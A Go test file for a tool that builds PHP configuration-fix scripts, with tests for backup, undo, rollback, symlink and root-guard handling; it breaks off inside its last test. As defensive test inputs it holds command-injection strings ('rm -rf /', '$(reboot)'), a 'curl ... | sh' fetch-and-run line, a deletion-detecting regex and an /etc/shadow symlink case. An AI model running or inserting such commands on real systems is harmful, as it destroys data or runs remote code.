package serverfix_test

import (
	"bytes"
	"context"
	"errors"
	"io"
	"net"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"

	"golang.org/x/crypto/ssh/agent"

	"github.com/kvarot/michel/internal/egress"
	"github.com/kvarot/michel/internal/policy"
	"github.com/kvarot/michel/internal/serverfix"
	"github.com/kvarot/michel/internal/sshx"
	"github.com/kvarot/michel/internal/sshx/sshtest"
	"github.com/kvarot/michel/internal/target"
)

const (
	cliIni   = "/etc/php/8.2/cli/php.ini"
	fpmIni   = "/etc/php/8.2/fpm/php.ini"
	opcache  = "/etc/php/8.2/fpm/conf.d/10-opcache.ini"
	pool     = "/etc/php/8.2/fpm/pool.d/www.conf"
	userIni  = "/home/deploy/www/demo/.user.ini"
	fpmBin   = "/usr/sbin/php-fpm8.2"
	cliBin   = "/usr/bin/php8.2"
	cid      = "01CORRECTIONDEMO"
	iniText  = "[PHP]\nengine = On\ndisplay_errors = On ; dev\nmemory_limit = 128M\n"
	poolText = "[www]\nuser = www-data\nlisten = /run/php/php8.2-fpm.sock\n\nphp_admin_flag[allow_url_include] = on\n"
	userText = "display_errors = On\n"
	opText   = "opcache.enable = 1\n"
)

func demoTarget() target.Target {
	return target.Target{ID: "01TARGETDEMO", Name: "srv-demo", Host: "192.0.2.10", User: "deploy",
		Kind: target.KindVPS, Env: target.EnvProd, Sudo: target.SudoNone, SiteURL: "https://example.test"}
}

func demoInventory() target.Inventory {
	return target.Inventory{
		TargetID: "01TARGETDEMO",
		OS:       target.OSInfo{ID: "debian", VersionID: "12"},
		PHP: []target.PHPRuntime{
			{SAPI: "cli", Binary: cliBin, Version: "8.2.7", FromPackage: "php8.2-cli", LoadedIni: cliIni, ScannedDir: "/etc/php/8.2/cli/conf.d"},
			{SAPI: "fpm", Binary: fpmBin, Version: "8.2.7", FromPackage: "php8.2-fpm", LoadedIni: fpmIni,
				ScannedDir: "/etc/php/8.2/fpm/conf.d", ScannedFiles: []string{opcache}, PoolFiles: []string{pool}},
		},
		Packages: []target.Package{{Name: "php8.2-fpm", Version: "8.2.7-1~deb12u1"}, {Name: "libdemo", Version: "1.0-1"}},
		Directives: []target.Directive{
			{SAPI: "fpm", Binary: fpmBin, Name: "display_errors", Value: "On ; dev", File: fpmIni, Line: 3},
			{SAPI: "fpm", Binary: fpmBin, Name: "opcache.enable", Value: "1", File: opcache, Line: 1},
			{SAPI: "fpm", Binary: fpmBin, Name: "user", Value: "www-data", File: pool, Line: 2},
			{SAPI: "fpm", Binary: fpmBin, Name: "php_admin_flag[allow_url_include]", Value: "on", File: pool, Line: 5},
			{SAPI: "user_ini", Binary: fpmBin, Name: "display_errors", Value: "On", File: userIni, Line: 1},
		},
		Files: []target.FileSeen{{Path: cliIni}, {Path: fpmIni}, {Path: opcache}, {Path: pool}, {Path: userIni}},
	}
}

func setDirective(sapi, name, value, path string) serverfix.Plan {
	return serverfix.Plan{TargetID: "01TARGETDEMO", FindingID: "f1",
		Actions: []serverfix.Action{{Op: serverfix.OpSetDirective, SAPI: sapi, Directive: name, Value: value, Path: path}}}
}

func validate(t *testing.T, p serverfix.Plan, tg target.Target) serverfix.Plan {
	t.Helper()
	v, err := serverfix.Validate(p, tg, demoInventory())
	if err != nil {
		t.Fatalf("Validate: %v", err)
	}
	return v
}

func render(t *testing.T, p serverfix.Plan, tg target.Target) serverfix.Bundle {
	t.Helper()
	b, err := serverfix.Render(validate(t, p, tg), tg, cid)
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	return b
}

func ops(p serverfix.Plan) []serverfix.Op {
	var out []serverfix.Op
	for _, a := range p.Actions {
		out = append(out, a.Op)
	}
	return out
}

func TestValidateAddsBackupTestReload(t *testing.T) {
	v := validate(t, setDirective("fpm", "display_errors", "0", ""), demoTarget())
	want := []serverfix.Op{serverfix.OpBackup, serverfix.OpSetDirective, serverfix.OpTestConfig, serverfix.OpReload, serverfix.OpCheckSite}
	if got := ops(v); strings.Join(opStrings(got), ",") != strings.Join(opStrings(want), ",") {
		t.Fatalf("ops %v, want %v", got, want)
	}
	if a := v.Actions[0]; a.Path != fpmIni {
		t.Errorf("backup %q", a.Path)
	}
	if a := v.Actions[1]; a.Path != fpmIni || a.Line != 3 || a.Append || a.Key != "display_errors" {
		t.Errorf("set %+v", a)
	}
	if a := v.Actions[2]; a.Binary != fpmBin || a.SAPI != "fpm" {
		t.Errorf("test %+v", a)
	}
	if a := v.Actions[3]; a.Service != "php8.2-fpm" || a.Manager != "systemctl" {
		t.Errorf("reload %+v", a)
	}
	if v.NeedsSnapshot {
		t.Error("a directive needs no snapshot")
	}
	// The agent's own steps are checked then replaced.
	p := setDirective("fpm", "display_errors", "0", "")
	p.Actions = append([]serverfix.Action{{Op: serverfix.OpBackup, Path: fpmIni}, {Op: serverfix.OpTestConfig}},
		append(p.Actions, serverfix.Action{Op: serverfix.OpReload, Service: "php8.2-fpm"})...)
	if v2 := validate(t, p, demoTarget()); len(v2.Actions) != len(v.Actions) {
		t.Errorf("normalized plan has %d actions, want %d", len(v2.Actions), len(v.Actions))
	}
	// The CLI php.ini is tested with the CLI and reloads nothing.
	v = validate(t, setDirective("cli", "allow_url_include", "0", ""), demoTarget())
	if got := opStrings(ops(v)); strings.Join(got, ",") != "backup_file,set_directive,test_config,check_site" {
		t.Errorf("cli ops %v", got)
	}
}

func opStrings(o []serverfix.Op) []string {
	var s []string
	for _, x := range o {
		s = append(s, string(x))
	}
	return s
}

func TestRejectPathNotInInventory(t *testing.T) {
	tg := demoTarget()
	for _, p := range []string{
		"/etc/php/8.2/fpm/conf.d/99-michel.ini", // never read: would be a new file
		"/etc/passwd",
		"/etc/nginx/nginx.conf",
		"/home/other/www/.user.ini",
		"/root/.user.ini",
		"/etc/php/8.2/fpm/php.ini.key",
		"relative/php.ini",
	} {
		_, err := serverfix.Validate(setDirective("fpm", "display_errors", "0", p), tg, demoInventory())
		if !errors.Is(err, serverfix.ErrPathNotAllowed) {
			t.Errorf("%s: %v, want ErrPathNotAllowed", p, err)
		}
		bk := serverfix.Plan{Actions: []serverfix.Action{{Op: serverfix.OpBackup, Path: p}}}
		if _, err := serverfix.Validate(bk, tg, demoInventory()); !errors.Is(err, serverfix.ErrPathNotAllowed) {
			t.Errorf("backup %s: %v", p, err)
		}
	}
	// A file of the inventory lists that was not actually read is refused.
	inv := demoInventory()
	inv.Files = inv.Files[:1]
	if _, err := serverfix.Validate(setDirective("fpm", "display_errors", "0", ""), tg, inv); !errors.Is(err, serverfix.ErrPathNotAllowed) {
		t.Errorf("unread php.ini: %v", err)
	}
	// Unknown directive, service, package; another server.
	if _, err := serverfix.Validate(setDirective("fpm", "disable_functions", "", ""), tg, demoInventory()); !errors.Is(err, serverfix.ErrUnknownDirective) {
		t.Errorf("directive: %v", err)
	}
	p := setDirective("fpm", "display_errors", "0", "")
	p.Actions = append(p.Actions, serverfix.Action{Op: serverfix.OpReload, Service: "nginx"})
	if _, err := serverfix.Validate(p, tg, demoInventory()); !errors.Is(err, serverfix.ErrUnknownService) {
		t.Errorf("service: %v", err)
	}
	pk := serverfix.Plan{Actions: []serverfix.Action{{Op: serverfix.OpPackageUpgrade, Package: "openssh-server", Version: "1:9.2"}}}
	if _, err := serverfix.Validate(pk, tg, demoInventory()); !errors.Is(err, serverfix.ErrUnknownPackage) {
		t.Errorf("package: %v", err)
	}
	other := setDirective("fpm", "display_errors", "0", "")
	other.TargetID = "01OTHER"
	if _, err := serverfix.Validate(other, tg, demoInventory()); !errors.Is(err, serverfix.ErrBadAction) {
		t.Errorf("other server: %v", err)
	}
	if _, err := serverfix.Validate(serverfix.Plan{Actions: []serverfix.Action{{Op: "remove_file", Path: fpmIni}}}, tg, demoInventory()); !errors.Is(err, serverfix.ErrBadAction) {
		t.Errorf("unknown op: %v", err)
	}
}

func TestRejectDotDotPath(t *testing.T) {
	for _, p := range []string{"/etc/php/8.2/fpm/../fpm/php.ini", "/etc/php/8.2/fpm/./php.ini", "/etc/php/8.2/fpm//php.ini", "/etc/php/8.2/fpm/..php.ini"} {
		if _, err := serverfix.Validate(setDirective("fpm", "display_errors", "0", p), demoTarget(), demoInventory()); !errors.Is(err, serverfix.ErrPathNotAllowed) {
			t.Errorf("%s: %v", p, err)
		}
	}
}

// deletion matches a deleting command at the start of a line or after a
// separator.
var deletion = regexp.MustCompile(`(^|[\s;{(|&])(rm|mv|dd|truncate|shred|unlink|rmdir)(\s|$)|\s-delete(\s|$)`)

func TestRenderEscapesHostileValues(t *testing.T) {
	tg := demoTarget()
	for _, v := range []string{
		"Off'; rm -rf / #", "0\nrm -rf /", "0 ; dev", "$(reboot)", "`reboot`", "0|sh", "a&b", `a\b`, `"0"`,
		"0\x00", "0\r", "${HOME}", "On # x", "x=y", strings.Repeat("a", 600),
	} {
		_, err := serverfix.Validate(setDirective("fpm", "display_errors", v, ""), tg, demoInventory())
		if !errors.Is(err, serverfix.ErrBadValue) {
			t.Errorf("Validate(%q): %v, want ErrBadValue", v, err)
		}
		// Render never trusts its plan: a hostile value slipped past
		// Validate is refused too.
		p := validate(t, setDirective("fpm", "display_errors", "0", ""), tg)
		p.Actions[1].Value = v
		if _, err := serverfix.Render(p, tg, cid); !errors.Is(err, serverfix.ErrBadValue) {
			t.Errorf("Render(%q): %v", v, err)
		}
	}
	if _, err := serverfix.Validate(serverfix.Plan{Actions: []serverfix.Action{{Op: serverfix.OpSetDirective, SAPI: "fpm", Directive: "memory_limit", Value: "-1"}}}, tg, demoInventory()); !errors.Is(err, serverfix.ErrBadValue) {
		t.Errorf("memory_limit=-1: %v", err)
	}
	// Hostile paths, keys and services in a forged plan.
	base := validate(t, setDirective("fpm", "display_errors", "0", ""), tg)
	forge := func(f func(p *serverfix.Plan)) error {
		p := base
		p.Actions = append([]serverfix.Action(nil), base.Actions...)
		f(&p)
		_, err := serverfix.Render(p, tg, cid)
		return err
	}
	for name, f := range map[string]func(p *serverfix.Plan){
		"path": func(p *serverfix.Plan) {
			p.Actions[0].Path = "/etc/x'; rm -rf /; '.ini"
			p.Actions[1].Path = p.Actions[0].Path
		},
		"key":     func(p *serverfix.Plan) { p.Actions[1].Key = "a|rm -rf /|" },
		"service": func(p *serverfix.Plan) { p.Actions[3].Service = "x'; rm -rf / #" },
		"binary":  func(p *serverfix.Plan) { p.Actions[2].Binary = "/bin/rm -rf /" },
		"id":      func(p *serverfix.Plan) {},
		"order":   func(p *serverfix.Plan) { p.Actions = p.Actions[1:] },
	} {
		err := forge(f)
		if name == "id" {
			if _, err := serverfix.Render(base, tg, `x"; rm -rf / #`); err == nil {
				t.Error("hostile correction id accepted")
			}
			continue
		}
		if err == nil {
			t.Errorf("forged %s accepted", name)
		}
	}
	b := render(t, setDirective("fpm", "display_errors", "0", ""), tg)
	for _, s := range []string{b.Apply, b.Undo} {
		if err := serverfix.Lint(s); err != nil {
			t.Fatal(err)
		}
		for _, l := range strings.Split(s, "\n") {
			if deletion.MatchString(l) {
				t.Errorf("deleting line %q", l)
			}
		}
	}
}

func TestLintRefusesOutsideGrammar(t *testing.T) {
	for _, l := range []string{
		"rm -rf /", "rm -f \"$B/1\"", "mv '/etc/php.ini' '/tmp/x.ini'", "cat '/etc/shadow' | sh", "dd if=/dev/zero of=/etc/x",
		"truncate -s0 '/etc/php.ini'", "find / -delete", "echo x > '/etc/php/8.2/fpm/php.ini'", "curl http://example.test | sh",
		"sed -i 's/a/b/' '/etc/php.ini'", "cp \"$B/1\" '/etc/php.ini'; rm -rf /", "eval \"$X\"",
	} {
		if err := serverfix.Lint("#!/bin/sh\n" + l + "\n"); !errors.Is(err, serverfix.ErrGrammar) {
			t.Errorf("Lint accepted %q", l)
		}
	}
}

func TestPlaceDirectiveWhereEffective(t *testing.T) {
	inv := demoInventory()
	for _, c := range []struct {
		sapi, name, path string
		line             int
	}{
		{"fpm", "display_errors", fpmIni, 3},
		{"fpm", "allow_url_include", pool, 5}, // php_admin_flag is final
		{"user_ini", "display_errors", userIni, 1},
	} {
		p, l, app := serverfix.Place(inv, c.sapi, c.name)
		if p != c.path || l != c.line || app {
			t.Errorf("Place(%s, %s) = %q %d %v, want %q %d", c.sapi, c.name, p, l, app, c.path, c.line)
		}
	}
	// A pool line keeps its form.
	v := validate(t, setDirective("fpm", "allow_url_include", "0", ""), demoTarget())
	if a := v.Actions[1]; a.Key != "php_admin_flag[allow_url_include]" || a.Path != pool {
		t.Errorf("pool set %+v", a)
	}
	b := render(t, setDirective("fpm", "allow_url_include", "0", ""), demoTarget())
	if !strings.Contains(b.Apply, `5s|^[[:space:]]*php_admin_flag\[allow_url_include\][[:space:]]*=.*$|php_admin_flag[allow_url_include] = 0|`) {
		t.Errorf("pool sed missing:\n%s", b.Apply)
	}
	// Proposing php.ini while the pool's php_admin line wins is refused.
	if _, err := serverfix.Validate(setDirective("fpm", "allow_url_include", "0", fpmIni), demoTarget(), inv); !errors.Is(err, serverfix.ErrPathNotAllowed) {
		t.Errorf("ineffective php.ini: %v", err)
	}
	// A system directive has no effect in a .user.ini.
	if _, err := serverfix.Validate(setDirective("user_ini", "expose_php", "0", ""), demoTarget(), inv); !errors.Is(err, serverfix.ErrPathNotAllowed) {
		t.Errorf("system directive in .user.ini: %v", err)
	}
}

func TestPlaceAppendsWhenAbsent(t *testing.T) {
	inv := demoInventory()
	if p, l, app := serverfix.Place(inv, "fpm", "session.cookie_secure"); p != fpmIni || l != 0 || !app {
		t.Errorf("fpm: %q %d %v", p, l, app)
	}
	if p, _, app := serverfix.Place(inv, "user_ini", "session.cookie_secure"); p != userIni || !app {
		t.Errorf("user_ini: %q %v", p, app)
	}
	b := render(t, setDirective("fpm", "session.cookie_secure", "1", ""), demoTarget())
	if !strings.Contains(b.Apply, `printf '\n%s\n' 'session.cookie_secure = 1' >> "$B/1.1"`) {
		t.Errorf("append missing:\n%s", b.Apply)
	}
}

func TestNoConfDFileCreated(t *testing.T) {
	inv := demoInventory()
	tg := demoTarget()
	read := map[string]bool{}
	for _, f := range inv.Files {
		read[f.Path] = true
	}
	quoted := regexp.MustCompile(`'(/[^']*)'`)
	for _, d := range []string{"display_errors", "expose_php", "session.cookie_secure", "fatal_error_backtraces", "session.upload_progress.enabled", "open_basedir"} {
		b := render(t, setDirective("fpm", d, "0", ""), tg)
		for _, m := range quoted.FindAllStringSubmatch(b.Apply+b.Undo, -1) {
			if strings.HasPrefix(m[1], "/etc/") && !read[m[1]] {
				t.Errorf("%s: script names %s, a file that was not read", d, m[1])
			}
			if strings.Contains(m[1], "conf.d/") && m[1] != opcache {
				t.Errorf("%s: script writes in conf.d: %s", d, m[1])
			}
		}
	}
	// An existing conf.d file that does not set the directive is not where
	// Michel adds a line.
	if _, err := serverfix.Validate(setDirective("fpm", "session.cookie_secure", "1", opcache), tg, inv); !errors.Is(err, serverfix.ErrPathNotAllowed) {
		t.Errorf("append to conf.d: %v", err)
	}
	// No loaded php.ini: nowhere to add a line, never a new file.
	inv.PHP[1].LoadedIni = ""
	if _, err := serverfix.Validate(setDirective("fpm", "session.cookie_secure", "1", ""), tg, inv); !errors.Is(err, serverfix.ErrPathNotAllowed) {
		t.Errorf("no php.ini: %v", err)
	}
}

func TestSudoPrefixOnlyWhenNopasswd(t *testing.T) {
	tg := demoTarget()
	plain := render(t, setDirective("fpm", "display_errors", "0", ""), tg)
	if strings.Contains(plain.Apply+plain.Undo, "sudo") {
		t.Errorf("sudo without nopasswd:\n%s", plain.Apply)
	}
	tg.Sudo = target.SudoNopasswd
	s := render(t, setDirective("fpm", "display_errors", "0", ""), tg)
	for _, want := range []string{
		"sudo -n test -w '" + fpmIni + "'", "sudo -n cat '" + fpmIni + "' > \"$B/1\"", "sudo -n cp \"$B/1.1\" '" + fpmIni + "'",
		"sudo -n '" + fpmBin + "' -t", "sudo -n systemctl reload 'php8.2-fpm'",
	} {
		if !strings.Contains(s.Apply, want) {
			t.Errorf("missing %q in:\n%s", want, s.Apply)
		}
	}
	// Files of the backup folder are the user's own: no sudo for them.
	if strings.Contains(s.Apply, "sudo -n sed") || strings.Contains(s.Apply, "sudo -n printf") {
		t.Error("sudo on a backup file")
	}
	if s.Hash == plain.Hash {
		t.Error("same hash for different scripts")
	}
}

// harness is a test server with the demo files and the mini shell.
type harness struct {
	srv  *sshtest.Server
	sh   *sshtest.Shell
	fpmT int // exit status of php-fpm -t
	ran  []string
}

func newHarness(t *testing.T, sh *sshtest.Shell, writable map[string]bool, sudo bool) *harness {
	h := &harness{sh: sh}
	h.srv = sshtest.New(t, sshtest.Options{
		Files: map[string]string{fpmIni: iniText, cliIni: iniText, pool: poolText, userIni: userText, opcache: opText,
			"/etc/shadow": "root:x:1::\n"},
		Writable: writable,
		Sudo:     sudo,
		Shell:    sh.Func(),
		Commands: map[string]sshtest.Handler{
			fpmBin:       func(e sshtest.Exec) int { return h.fpmT },
			cliBin:       func(e sshtest.Exec) int { return 0 },
			"systemctl":  func(e sshtest.Exec) int { return 0 },
			"apt-get":    func(e sshtest.Exec) int { return 0 },
			"rc-service": func(e sshtest.Exec) int { return 0 },
		},
	})
	return h
}

// run runs a script through the shell directly (no SSH).
func (h *harness) run(script string) (int, string) {
	var out, errb bytes.Buffer
	code := h.sh.Run(h.srv, script, &out, &errb)
	return code, errb.String()
}

func (h *harness) file(t *testing.T, p string) string {
	t.Helper()
	v, ok := h.srv.File(p)
	if !ok {
		t.Fatalf("%s missing", p)
	}
	return v
}

func TestScriptStopsBeforeChangeWhenNotWritable(t *testing.T) {
	h := newHarness(t, &sshtest.Shell{UID: 1000, Home: "/home/deploy"}, nil, false)
	b := render(t, setDirective("fpm", "display_errors", "0", ""), demoTarget())
	code, stderr := h.run(b.Apply)
	if code != 3 || !strings.Contains(stderr, "lance ce script en root") {
		t.Fatalf("exit %d, stderr %q", code, stderr)
	}
	if h.file(t, fpmIni) != iniText {
		t.Error("php.ini changed")
	}
	if _, ok := h.srv.File("/home/deploy/.michel/backups/" + cid + "/1"); ok {
		t.Error("backup made before the check")
	}
	// With sudo -n refused (no nopasswd on the server), same stop.
	tg := demoTarget()
	tg.Sudo = target.SudoNopasswd
	b = render(t, setDirective("fpm", "display_errors", "0", ""), tg)
	if code, _ := h.run(b.Apply); code != 3 || h.file(t, fpmIni) != iniText {
		t.Errorf("sudo refused: exit %d", code)
	}
}

func TestUndoRestoresBackups(t *testing.T) {
	h := newHarness(t, &sshtest.Shell{UID: 0, Home: "/root"}, nil, false)
	p := setDirective("fpm", "display_errors", "0", "")
	p.Actions = append(p.Actions, serverfix.Action{Op: serverfix.OpSetDirective, SAPI: "fpm", Directive: "allow_url_include", Value: "0"},
		serverfix.Action{Op: serverfix.OpSetDirective, SAPI: "fpm", Directive: "session.cookie_secure", Value: "1"})
	b := render(t, p, demoTarget())
	if code, stderr := h.run(b.Apply); code != 0 {
		t.Fatalf("apply exit %d: %s\n%s", code, stderr, b.Apply)
	}
	gotIni := h.file(t, fpmIni)
	if !strings.Contains(gotIni, "\ndisplay_errors = 0\n") || strings.Contains(gotIni, "; dev") || !strings.HasSuffix(gotIni, "\nsession.cookie_secure = 1\n") {
		t.Errorf("php.ini after apply:\n%s", gotIni)
	}
	if !strings.Contains(h.file(t, pool), "\nphp_admin_flag[allow_url_include] = 0\n") {
		t.Errorf("pool after apply:\n%s", h.file(t, pool))
	}
	// Running apply twice is refused: the first backups are kept.
	if code, _ := h.run(b.Apply); code != 4 {
		t.Errorf("second apply exit %d", code)
	}
	if code, stderr := h.run(b.Undo); code != 0 {
		t.Fatalf("undo exit %d: %s", code, stderr)
	}
	if h.file(t, fpmIni) != iniText || h.file(t, pool) != poolText {
		t.Error("undo did not restore byte for byte")
	}
	// The backups stay on the server.
	if h.file(t, "/root/.michel/backups/"+cid+"/1") != iniText {
		t.Error("backup gone")
	}
	for _, c := range h.sh.Ran() {
		if deletion.MatchString(c) {
			t.Errorf("ran %q", c)
		}
	}
}

func TestApplyRollsBackWhenAStepFails(t *testing.T) {
	h := newHarness(t, &sshtest.Shell{UID: 0, Home: "/root"}, nil, false)
	h.fpmT = 1 // php-fpm -t fails after the change
	b := render(t, setDirective("fpm", "display_errors", "0", ""), demoTarget())
	code, stderr := h.run(b.Apply)
	if code == 0 || !strings.Contains(stderr, "echec: fichiers remis") {
		t.Fatalf("exit %d, stderr %q", code, stderr)
	}
	if h.file(t, fpmIni) != iniText {
		t.Errorf("php.ini not restored:\n%s", h.file(t, fpmIni))
	}
	ran := strings.Join(h.sh.Ran(), "\n")
	if !strings.Contains(ran, "systemctl reload php8.2-fpm") {
		t.Errorf("rollback did not reload:\n%s", ran)
	}
	// The line moved since the collection: the script stops, nothing changes.
	h2 := newHarness(t, &sshtest.Shell{UID: 0, Home: "/root"}, nil, false)
	h2.srv.SetFile(fpmIni, "[PHP]\nengine = On\n\ndisplay_errors = On\n")
	if code, stderr := h2.run(b.Apply); code != 5 || !strings.Contains(stderr, "ligne introuvable") {
		t.Errorf("moved line: exit %d %q", code, stderr)
	}
	if h2.file(t, fpmIni) != "[PHP]\nengine = On\n\ndisplay_errors = On\n" {
		t.Error("moved line: file changed")
	}
}

func TestSymlinkedFileRefused(t *testing.T) {
	// A .user.ini swapped for a link to /etc/shadow is never read nor
	// written, whoever runs the script.
	sh := &sshtest.Shell{UID: 1000, Home: "/home/deploy", Links: map[string]string{userIni: "/etc/shadow"}}
	h := newHarness(t, sh, nil, true)
	b := render(t, setDirective("user_ini", "display_errors", "0", ""), demoTarget())
	code, stderr := h.run(b.Apply)
	if code != 6 || !strings.Contains(stderr, "lien refuse") {
		t.Fatalf("exit %d %q", code, stderr)
	}
	if h.file(t, "/etc/shadow") != "root:x:1::\n" {
		t.Error("shadow touched")
	}
	if _, ok := h.srv.File("/home/deploy/.michel/backups/" + cid + "/1"); ok {
		t.Error("link read into a backup")
	}
	// A root php.ini that became a link is refused too, also on undo.
	h2 := newHarness(t, &sshtest.Shell{UID: 0, Home: "/root", Links: map[string]string{fpmIni: "/etc/shadow"}}, nil, false)
	b2 := render(t, setDirective("fpm", "display_errors", "0", ""), demoTarget())
	if code, _ := h2.run(b2.Apply); code != 6 {
		t.Errorf("php.ini link: exit %d", code)
	}
	if !strings.Contains(b2.Undo, "[ ! -L '"+fpmIni+"' ] || { echo \"lien refuse\" >&2; exit 6; }") {
		t.Errorf("undo without link check:\n%s", b2.Undo)
	}
	if h2.file(t, "/etc/shadow") != "root:x:1::\n" {
		t.Error("shadow touched")
	}
}

func TestUserIniRunsAsOwnerNeverRoot(t *testing.T) {
	tg := demoTarget()
	tg.Sudo = target.SudoNopasswd
	b := render(t, setDirective("user_ini", "display_errors", "0", ""), tg)
	if strings.Contains(b.Apply+b.Undo, "sudo") {
		t.Errorf(".user.ini step with sudo:\n%s", b.Apply)
	}
	if strings.Contains(b.Apply, " -c ") {
		t.Errorf(".user.ini parsed as a php.ini:\n%s", b.Apply)
	}
	guard := `[ "$(id -u)" != 0 ] || { echo "ne lance pas ce script en root" >&2; exit 3; }`
	if !strings.Contains(b.Apply, guard) || !strings.Contains(b.Undo, guard) {
		t.Errorf("no root guard:\n%s", b.Apply)
	}
	root := newHarness(t, &sshtest.Shell{UID: 0, Home: "/root"}, nil, true)
	if code, _ := root.run(b.Apply); code != 3 || root.file(t, userIni) != userText {
		t.Errorf("run as root: exit %d", code)
	}
	owner := newHarness(t, &sshtest.Shell{UID: 1000, Home: "/home/deploy"}, nil, false)
	if code, stderr := owner.run(b.Apply); code != 0 || owner.file(t, userIni) != "display_errors = 0\n" {
		t.Fatalf("run as owner: exit %d %s\n%s", code, stderr, owner.file(t, userIni))
	}
	if code, _ := owner.run(b.Undo); code != 0 || owner.file(t, userIni) != userText {
		t.Errorf("undo as owner: exit %d", code)
	}
	// A .user.ini fix never mixes with root files or packages.
	p := setDirective("user_ini", "display_errors", "0", "")
	p.Actions = append(p.Actions, serverfix.Action{Op: serverfix.OpSetDirective, SAPI: "fpm", Directive: "display_errors", Value: "0"})
	if _, err := serverfix.Validate(p, tg, demoInventory()); !errors.Is(err, serverfix.ErrBadAction) {
		t.Errorf("mixed: %v", err)
	}
}

func TestHostileOwnerRefused(t *testing.T) {
	inv := demoInventory()
	const shared = "/var/www/demo/.user.ini"
	inv.Directives = append(inv.Directives, target.Directive{SAPI: "user_ini", Name: "session.cookie_secure", Value: "0", File: shared, Line: 1})
	inv.Files = append(inv.Files, target.FileSeen{Path: shared})
	for _, u := range []string{"root", "", "x;rm -rf /", "Bad User", "a'b", "-u"} {
		tg := demoTarget()
		tg.User = u
		_, err := serverfix.Validate(setDirective("user_ini", "session.cookie_secure", "1", shared), tg, inv)
		if !errors.Is(err, serverfix.ErrPathNotAllowed) {
			t.Errorf("owner %q: %v", u, err)
		}
	}
	tg := demoTarget()
	v, err := serverfix.Validate(setDirective("user_ini", "session.cookie_secure", "1", shared), tg, inv)
	if err != nil {
		t.Fatal(err)
	}
	tg.User = "root"
	if _, err := serverfix.Render(v, tg, cid); !errors.Is(err, serverfix.ErrPathNotAllowed) {
		t.Errorf("Render as root owner: %v", err)
	}
}

func TestPackageUndoSaysSnapshot(t *testing.T) {
	p := serverfix.Plan{TargetID: "01TARGETDEMO", Actions: []serverfix.Action{{Op: serverfix.OpPackageUpgrade, Package: "php8.2-fpm", Version: "8.2.29-1~deb12u1"}}}
	v := validate(t, p, demoTarget())
	if !v.NeedsSnapshot {
		t.Error("NeedsSnapshot not set")
	}
	b, err := serverfix.Render(v, demoTarget(), cid)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(b.Apply, "apt-get install -y -o Dpkg::Options::=--force-confold --only-upgrade 'php8.2-fpm=8.2.29-1~deb12u1'") {
		t.Errorf("apply:\n%s", b.Apply)
	}
	if !strings.Contains(b.Apply, `[ "$(id -u)" = 0 ]`) {
		t.Error("no root check without sudo")
	}
	if !strings.Contains(b.Undo, `echo "retour par ton snapshot"`) || strings.Contains(b.Undo, "apt-get") || strings.Contains(b.Undo, "install") {
		t.Errorf("undo:\n%s", b.Undo)
	}
	h := newHarness(t, &sshtest.Shell{UID: 0, Home: "/root"}, nil, false)
	var out, errb bytes.Buffer
	if code := h.sh.Run(h.srv, b.Undo, &out, &errb); code != 0 || !strings.Contains(out.String(), "retour par ton snapshot") {
		t.Errorf("undo run: %d %q", code, out.String())
	}
	// dnf and apk.
	for os, want := range map[string]string{"rocky": "dnf -y upgrade 'libdemo-1.1-1'", "alpine": "apk add 'libdemo=1.1-1'"} {
		inv := demoInventory()
		inv.OS.ID = os
		v, err := serverfix.Validate(serverfix.Plan{Actions: []serverfix.Action{{Op: serverfix.OpPackageUpgrade, Package: "libdemo", Version: "1.1-1"}}}, demoTarget(), inv)
		if err != nil {
			t.Fatal(err)
		}
		b, err := serverfix.Render(v, demoTarget(), cid)
		if err != nil || !strings.Contains(b.Apply, want) {
			t.Errorf("%s: %v\n%s", os, err, b.Apply)
		}
	}
}

func TestSimulationWithRemovalIsRefused(t *testing.T) {
	apt := "NOTE: This is only a simulation!\nInst php8.2-fpm [8.2.7-1~deb12u1] (8.2.29-1~deb12u1 Debian-Security:12/stable-security [amd64])\n" +
		"Inst libdemo2 (2.0-1 Debian:12/stable [amd64])\nRemv libdemo [1.0-1]\nConf php8.2-fpm (8.2.29-1~deb12u1 Debian-Security:12/stable-security [amd64])\n"
	r, err := serverfix.ParseSimulation("apt", apt)
	var wr serverfix.ErrWouldRemove
	if !errors.As(err, &wr) || len(wr.Packages) != 1 || wr.Packages[0] != "libdemo" {
		t.Fatalf("apt: %v", err)
	}
	if len(r.Upgrades) != 1 || r.Upgrades[0] != "php8.2-fpm" || len(r.Installs) != 1 || r.Installs[0] != "libdemo2" {
		t.Errorf("apt result %+v", r)
	}
	if _, err := serverfix.ParseSimulation("apt", "Inst php8.2-fpm [8.2.7-1] (8.2.29-1 x)\nConf php8.2-fpm (8.2.29-1 x)\n"); err != nil {
		t.Errorf("clean apt: %v", err)
	}
	apk := "(1/2) Upgrading libdemo (1.0-r0 -> 1.1-r0)\n(2/2) Purging libold (0.9-r0)\nOK: 10 MiB in 20 packages\n"
	if _, err := serverfix.ParseSimulation("apk", apk); !errors.As(err, &wr) || wr.Packages[0] != "libold" {
		t.Errorf("apk: %v", err)
	}
	dnf := "Dependencies resolved.\n================\n Package     Arch    Version    Repository   Size\n================\nUpgrading:\n libdemo     x86_64  1.1-1.el9  baseos       10 k\n" +
		"Removing dependent packages:\n libold      x86_64  0.9-1.el9  @baseos      5 k\n\nTransaction Summary\n================\nUpgrade  1 Package\n"
	r, err = serverfix.ParseSimulation("dnf", dnf)
	if !errors.As(err, &wr) || wr.Packages[0] != "libold" || len(r.Upgrades) != 1 || r.Upgrades[0] != "libdemo" {
		t.Errorf("dnf: %+v %v", r, err)
	}
	if _, err := serverfix.ParseSimulation("pacman", ""); !errors.Is(err, serverfix.ErrUnknownPackage) {
		t.Errorf("unknown manager: %v", err)
	}
}

func TestMajorUpgradeIsProposalOnly(t *testing.T) {
	for v, want := range map[string]error{"8.3.1-1~deb12u1": serverfix.ErrMajorUpgrade, "9.0.0-1": serverfix.ErrMajorUpgrade, "8.2.29-1~deb12u1": nil} {
		p := serverfix.Plan{Actions: []serverfix.Action{{Op: serverfix.OpPackageUpgrade, Package: "php8.2-fpm", Version: v}}}
		_, err := serverfix.Validate(p, demoTarget(), demoInventory())
		if !errors.Is(err, want) && !(want == nil && err == nil) {
			t.Errorf("%s: %v, want %v", v, err, want)
		}
	}
}

func TestHashCoversBothScriptsAndChecks(t *testing.T) {
	b := render(t, setDirective("fpm", "display_errors", "0", ""), demoTarget())
	if b.Hash != serverfix.Hash(b) || len(b.Hash) != 64 {
		t.Fatalf("hash %q", b.Hash)
	}
